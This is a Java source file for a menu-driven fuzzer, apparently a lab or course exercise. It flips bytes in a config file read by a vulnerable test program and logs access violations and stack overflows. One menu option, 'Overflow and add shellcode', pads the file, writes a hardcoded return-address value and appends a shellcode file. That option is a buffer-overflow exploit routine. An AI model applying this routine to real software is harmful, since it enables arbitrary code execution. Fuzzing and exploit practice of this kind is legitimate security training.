import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.Scanner;
import java.io.*;

public class fuzzerMain {
    public static void print_mas() throws Exception{
        System.out.println("You can choose some of border values or another:");
        for (int ct = 0; ct < 20; ct++) {
            String st = String.format("%02X ", Auto.mas_symbols[ct]);
            System.out.print(st + "= " + Auto.mas_symbols[ct] +", ");
        }
    }

    public static void main(String[] args) throws Exception{
        while (true) {
            System.out.println("\n1.Show config\n2.Compare config(1-5)\n3.Find symbols ',' ':' '=' ';' \\n");
            System.out.println("4.Change bytes\n5.Write to the end\n6.Return to default\n7.Run\n8.Auto mode\n9.Overflow and add shellcode\n0.Exit\n");
            System.out.println("> ");
            Scanner in = new Scanner(System.in);
            int answer = in.nextInt();
            switch (answer){

                case 0:
                    System.exit(0);
                case 1:
                    Config.print_config();
                    break;
                case 2:
                    Config.compare_config();
                    break;
                case 3:
                    Config.find_symbols(':');
                    Config.find_symbols(',');
                    Config.find_symbols(';');
                    Config.find_symbols('=');
                    break;
                case 4:
                    System.out.println("Offset > ");
                    int answerOffset = in.nextInt();
                    print_mas();
                    System.out.println("\nSize > ");
                    int answerSize = in.nextInt();
                    System.out.println("Value > ");
                    int answerValue = in.nextInt();
                    Change.change_bytes(answerOffset,answerSize,answerValue);
                    break;
                case 5:
                    print_mas();
                    System.out.println("\nOffset (0 if end of file) > ");
                    int answerOffset2 = in.nextInt();
                    System.out.println("\nCount > ");
                    int answerCount = in.nextInt();
                    System.out.println("Value > ");
                    int answerValue2 = in.nextInt();
                    Change.write_to_the_end(answerOffset2,answerCount,answerValue2);
                    break;
                case 6:
                    Change.return_default();
                    break;
                case 7:
                    Run_program.Run();
                    break;
                case 9:
                    Change.write_to_the_end(50,2514,70);
                    Change.change_bytes(2560,1,151);
                    Change.change_bytes(2561,1,18);
                    Change.change_bytes(2562,1,80);
                    Change.change_bytes(2563,1,98);
                    String content = new String ( Files.readAllBytes( Paths.get("shellcode.bin") ) );
                    File myFoo = new File("config_6");
                    FileWriter fooWriter = new FileWriter(myFoo, true);
                    fooWriter.write(content);
                    fooWriter.close();
                    break;
                case 8:
                    System.out.println("1.Check for border values\n2.Input your value");
                    int answerAuto = in.nextInt();
                    if (answerAuto==1){
                        Auto.auto_mode(0,0,1);
                    }
                    else{
                        print_mas();
                        System.out.println("\nSize > ");
                        int answerSize3 = in.nextInt();
                        System.out.println("Value > ");
                        int answerValue3 = in.nextInt();
                        Auto.auto_mode(answerSize3,answerValue3,0);
                    }
                    break;
            }

        }
    }
}

class Config{
    public static String inputConfig = "config_6";

    public static void print_config() throws Exception{
        Path inputFile = Paths.get(inputConfig);
        byte[] ConfigBytes = Files.readAllBytes(inputFile);
        int i = 0;
        for (byte b : ConfigBytes) {
            String st = String.format("%02X  ", b);
            System.out.print(st);
            i++;
            if ((i%16)==0){
                System.out.print("\n");
            }
        }
    }

    public static void compare_config() throws Exception{
        Path inputFile = Paths.get(inputConfig);
        byte[] ConfigBytes = Files.readAllBytes(inputFile);
        byte[] compare = new byte[48];
        int index_config = inputConfig.length();
        String inputConfig_change = "config_6";
        int i = 0;
        for (i=1; i<=5; i++){
            inputConfig_change = inputConfig_change.replace('6',(char)('0'+ i));
            Path inputFile2 = Paths.get(inputConfig_change);
            byte[] ConfigBytes2 = Files.readAllBytes(inputFile2);
            int j=0;
            for (byte b : ConfigBytes) {
                if (b!=ConfigBytes2[j])
                    compare[j]=1;
                else
                    compare[j]=0;
                j++;
                if (j>47)
                    break;
            }
        }
        int comp = 0;//print
        for (byte b : ConfigBytes) {
            if (compare[comp]==0){
                String st = String.format("%02X  ", b);
                System.out.print(st);
            }
            else
                System.out.print("00  ");
            if ((comp%16)==0){
                System.out.print("\n");
            }
            if (comp>=47)
                return;
            comp++;
        }
    }

    public static void find_symbols(char symbol) throws Exception{
        Path inputFile = Paths.get(inputConfig);
        byte[] ConfigBytes = Files.readAllBytes(inputFile);
        int occurrencesCount = 0; int i = 0;
        for (byte b : ConfigBytes) {
            if (b==symbol){
                System.out.println("Offset:" + i);
                i++;
                occurrencesCount++;
            }
        }
        System.out.println("Count symbol '" + symbol + "' is " + occurrencesCount);
    }
}

class Change{
    public static String inputConfig = "config_6";
    public static String inputConfigDef = "config_6_default";

    public static void change_bytes(int offset, int size, int value) throws Exception{
        RandomAccessFile file;
        file = new RandomAccessFile(inputConfig, "rw");
        file.seek(offset);
        for (int i = 0; i < size; i++) {
            file.write((char)value >> 8 * i);
        }
        file.close();
    }

    public static void write_to_the_end(int insert, int count, int value) throws Exception{
        RandomAccessFile file;
        file = new RandomAccessFile(inputConfig, "rw");
        long len;
        if (insert == 0){
            len = file.length();
        }
        else len = insert;
        for (int i = 0; i < count; i++)
        {
            file.seek(len+i);
            file.write((char)value);
        }
    }

    public static void return_default() throws Exception{
        String content = new String ( Files.readAllBytes( Paths.get(inputConfigDef) ) );
        File myFoo = new File(inputConfig);
        FileWriter fooWriter = new FileWriter(myFoo, false);
        fooWriter.write(content);
        fooWriter.close();
    }
}

class Run_program{
    public static int Run() throws Exception {
        int debug = CLoader.checkDebug();
        if (debug == 1) {
            System.out.println("ACCESS_VIOLATION");
            Auto.Save();
            return 1;
        } else if (debug == 2) {
            System.out.println("STACK_OVERFLOW");
            Auto.Save();
            return 2;
        } else if (debug == 3)
            System.out.println("Unknown exception");
        else System.out.println("Error");

       /* Process process = null;
        try {
            process = Runtime.getRuntime().exec("C:\\Users\\Win10\\IdeaProjects\\fuzzer\\vuln6.exe");
            int exitCode = process.waitFor();
            if (exitCode != 0) {
                throw new IOException("Command exited with " + exitCode);
            }
        } catch (Exception ex) {
            process.destroy();
            ex.printStackTrace();
        }*/
       return 0;
    }
}

class Auto{
    public static int mas_symbols[] = {
            0x00, 0xFF, 0xFF / 2, 0xFF / 2 + 1, 0xFF / 2 - 1,
            0x0000,0xFFFF, 0xFFFF / 2, 0xFFFF / 2 + 1, 0xFFFF / 2 - 1,
            0x000000,0xFFFFFF, 0xFFFFFF / 2, 0xFFFFFF / 2 + 1, 0xFFFFFF / 2 - 1,
            0x000000, 0xFFFFFFFF, 0xFFFFFFFF / 2, 0xFFFFFFFF / 2 + 1, 0xFFFFFFFF / 2 - 1 };

    public static void auto_mode(int size, int value, int type) throws Exception{
    if (type == 1){
        for (int ct = 0; ct < 20; ct++) {
            value = mas_symbols[ct];
            size = (ct / 5) + 1;
        for (int i = 1; i < 20; i+=size) {
            Change.change_bytes(i, size, value);
            int res = Run_program.Run();
            if ((res == 2)||(res==1))
                System.out.println("Offset:"+ i + "\nvalue: " + value);
            Change.return_default();
            }
        }
    }
    else{
        for (int i = 1; i < 20; i+=size) {
            Change.change_bytes(i, size, value);
            int res = Run_program.Run();
            if ((res == 2)||(res==1))
                System.out.println("Offset:"+ i + "\nvalue: " + value);
            }
            Change.return_default();
        }
    }

    public static void Save() throws Exception{
        String content = new String ( Files.readAllBytes(Paths.get(Change.inputConfig)));
        File myFoo = new File("config_6_save");
        FileWriter fooWriter = new FileWriter(myFoo, false);
        fooWriter.write(content);
        fooWriter.close();
    }
}